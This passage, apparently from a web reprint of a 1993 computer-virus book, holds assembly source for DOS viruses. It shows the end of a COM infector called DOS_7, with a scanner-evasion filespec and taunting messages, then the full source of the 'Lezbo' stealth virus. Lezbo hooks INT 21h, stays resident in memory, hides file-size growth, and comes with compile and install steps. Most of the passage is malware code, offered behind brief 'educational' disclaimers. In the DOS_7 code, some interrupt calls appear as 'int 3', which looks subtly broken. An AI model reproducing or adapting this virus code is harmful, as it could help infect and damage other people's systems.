&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; DX=100h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Write virus to file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>offset Host <span style="color: #339933;">-</span> <span style="color: #ff0000;">100h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Eh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Close infected file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
<br/>
Restore_Host<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ss</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Restore ES and DS</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Prepare to RETF to host</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Ah</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Restore DTA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Push proper COM entry</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">sp</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; point onto stack</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Move host to proper ofs</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retf&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; and Execute it</span><br/>
<br/>
<span style="color: black; font-style: italic;">;--- Virus Data -------------------------------------------</span><br/>
<br/>
Filespec&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'*W.C?M'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Avoid heuristic scanners</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; from reporting that the</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; infected files search</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; for COM files</span><br/>
MSG &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'is infected!'</span><br/>
msglen&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> msg<br/>
MSG2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'oy, are you ever dumb! '</span><br/>
msg2len &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> msg2<br/>
antivirus &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'MSDOS 7 (C)1993 ANARKICK SYSTEMS'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br/>
<span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">' DOS 6 Antivirus sucks. It missed this one! '</span><br/>
antiviruslen&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> antivirus<br/>
<br/>
<span style="color: black; font-style: italic;">;--- Host file is appended here ---------------------------</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'$'</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; for part of the host</span><br/>
<br/>
Host<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset <span style="color: black;">&#40;</span>message <span style="color: #339933;">-</span> host <span style="color: #339933;">+</span> <span style="color: #ff0000;">100h</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4CH</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
<br/>
message &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'[DOS 7v'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'] Lucifer Messiah$'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; END &nbsp; &nbsp; DOS_7<br/>
&nbsp;</div>
<h3><a name="pj2"></a>Lezbo Virus</h3>
<p>The <strong>Lezbo</strong> virus can infect .COM files, .EXE files, and .OVL (OVerLay files). It is a full stealth virus which hides the virus size increase of infected files. The time stamp is altered, as described in Chapter Five's discussion on directory stealth.</p>
<p>Notice how the virus installation code must determine whether the host is an .EXE or .COM type file. This is because .EXE files require much more processing before an effective infection can take place.</p>
<p>Other information is included in the virus source code comments.</p>
 
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">COMMENT~===============================================================<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LEZBO Virus<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">-----------</span><br/>
= &nbsp; &nbsp; &nbsp; &nbsp; Disassembly <span style="color: black;">&#40;</span>c<span style="color: black;">&#41;</span><span style="color: #ff0000;">1993</span> Karsten Johansson<span style="color: #339933;">,</span> PC Scavenger<br/>
=<br/>
=<br/>
=======================================================================<br/>
= &nbsp;CAUTION<span style="color: #339933;">:</span> This program is a highly virulent stealth virus<span style="color: #339933;">.</span> Once <span style="color: #00007f; font-weight: bold;">in</span><br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memory<span style="color: #339933;">,</span> it is virtually invisible<span style="color: #339933;">.</span><br/>
=<br/>
=<br/>
= &nbsp;NOTES<span style="color: #339933;">:</span> &nbsp; This is a demonstration virus only<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">and</span> will only execute<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; on the <span style="color: #ff0000;">386</span><span style="color: #339933;">+</span> computer<span style="color: #339933;">.</span> This was done to avoid widespread<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; misuse<span style="color: #339933;">.</span><br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; The virus installs itself <span style="color: #0000ff; font-weight: bold;">at</span> the base memory ceiling<span style="color: #339933;">.</span> When<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span> memory<span style="color: #339933;">,</span> infected files will <span style="color: #00007f; font-weight: bold;">not</span> show a size increase<span style="color: #339933;">.</span><br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; The virus is <span style="color: #ff0000;">666</span> bytes long<span style="color: #339933;">,</span> but uses 3K of memory when<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; installed<span style="color: #339933;">.</span><br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DO</span> <span style="color: #00007f; font-weight: bold;">NOT</span> INFECT ANYONE<span style="color: #7f007f;">'S SYSTEM BUT YOUR OWN! To do so is a<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; federal offence.<br/>
=<br/>
=<br/>
= &nbsp;COMPILE: With &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TASM: TASM LEZBO<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TLINK /3 LEZBO<br/>
=<br/>
= &nbsp;INSTALL: Execute LEZBO.EXE on a 386 or above only. All .COM, .EXE<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; and .OVL files will be infected if they are opened for any<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; reason. Execution on an 8086 or 286 computer will result<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; in a crash.<br/>
=<br/>
=======================================================================<br/>
= BEFORE COMPILING THIS CODE, IT MUST BE NOTED THAT THE AUTHOR AND<br/>
= PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT MAY<br/>
= BE INCURRED BY THE USE OF OR THE EXPERIMENTATION WITH COMPUTER<br/>
= VIRUSES. THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY. EDUCATION IS NOT<br/>
= HERE TO BE ABUSED.<br/>
=<br/>
=<br/>
=======================================================================<br/>
~<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .model&nbsp; tiny<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; P386N &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;386 non-protected mode<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .code<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Do NOT compile as a .COM file<br/>
<br/>
Lezbo:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; bx,offset Delta_Ofs &nbsp; &nbsp; ;Offset is altered during infect<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; bx,offset first_4 - offset Delta_Ofs<br/>
<br/>
Delta_Ofs:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; bx,offset first_4 &nbsp; &nbsp; &nbsp; ;bx = delta offset<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dec &nbsp; &nbsp; ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ax=0FFFFh -&gt; installation check<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 21h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or&nbsp; &nbsp; &nbsp; al,ah &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;are al and ah the same?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short exit_virus&nbsp; &nbsp; &nbsp; &nbsp; ;if yes, assume we are installed<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ds<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; di,di<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds,di &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;beginning of INT table segment<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; eax,ds:21h*4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get INT 21h vector<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dword ptr cs:int21_vec[bx],eax&nbsp; ;store it<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,es &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;es=PSP segment<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dec &nbsp; &nbsp; cx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;sub 1 to get MCB<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds,cx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ds=MCB<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; word ptr [di+3],80h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,word ptr [di+12h]&nbsp; &nbsp; ;get high memory segment<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; ax,080h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;give us room<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr [di+12h],ax&nbsp; &nbsp; ;save it<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; es,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;top of memory<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; ax,1000h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;reserve it for us<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr cs:XAX[bx],ax&nbsp; ;save for in INT 21h handler<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ds=cs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; si,bx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;point to beginning of virus<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,offset first_4 &nbsp; &nbsp; &nbsp; ;bytes to move<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;inc si,di<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; repz&nbsp; &nbsp; movsb &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;copy virus to top of memory<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds,cx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ds=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cli &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;turn interrupts off<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:[21h*4],offset New_21 &nbsp; &nbsp; &nbsp; ;point to new ofs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:[21h*4]+2,es&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;point to new seg<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sti &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;turn interrupts back on<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ds<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; es<br/>
<br/>
exit_virus:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; si,word ptr first_4[bx] ;point to stored 1st 4 bytes<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; di,100h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;di=beginning of host<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; bx,di &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;host starts at 0100h?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; short exit_EXE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;if not, exit for EXE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; di&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;push 100h on stack for RET<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; movsd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;restore first 4 bytes in host<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;execute host file as expected<br/>
<br/>
exit_EXE:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,es &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ax=PSP segment<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; ax,10h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; word ptr cs:[si+2],ax &nbsp; ;reallocate host entry<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; word ptr cs:[si+4],ax<br/>
